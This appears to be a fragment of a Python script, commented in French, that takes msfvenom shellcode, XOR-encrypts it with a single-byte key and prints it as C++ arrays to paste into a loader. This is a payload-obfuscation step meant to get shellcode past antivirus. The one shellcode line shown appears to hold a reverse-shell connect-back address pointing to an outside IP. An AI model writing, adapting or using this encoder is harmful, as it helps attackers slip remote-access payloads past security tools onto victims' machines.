...
# ==========================================
# 1. COLLE TON OUTPUT MSFVENOM ICI
# ==========================================
...
buf += b"\x49\xbc\x02\x00\x31\xa9\x03\x44\xab\x77\x41\x54"
...
# ==========================================
# 2. TA CLE (Format Hexadécimal)
# ==========================================
KEY = 0x8F  # On utilise un simple octet (byte)

def xor_encrypt(data, key):
    encrypted = bytearray()
    for byte in data:
        # XOR simple : on applique 0x8F à chaque octet
        encrypted.append(byte ^ key)
    return encrypted

def print_cpp_output(encrypted_buf, key):
    print("\n" + "="*50)
    print("CODE A COPIER DANS TON FICHIER C++ :")
    print("="*50 + "\n")
    
    # 1. La Clé (Format byte C++)
    print(f'unsigned char key = 0x{key:02X};')
    
    # 2. La Taille
    print(f'size_t payload_len = {len(encrypted_buf)};')
    
    # 3. Le Shellcode chiffré
    print('unsigned char payload[] = {')
    
    line = "    "
    for i, byte in enumerate(encrypted_buf):
        line += f"0x{byte:02x}, "
        if (i + 1) % 12 == 0:
            print(line)
            line = "    "
...
if __name__ == "__main__":
    if len(buf) == 0:
        print("ERREUR : Colle ton shellcode msfvenom ligne 6 !")
        sys.exit()
        
    encrypted_data = xor_encrypt(buf, KEY)
    print_cpp_output(encrypted_data, KEY)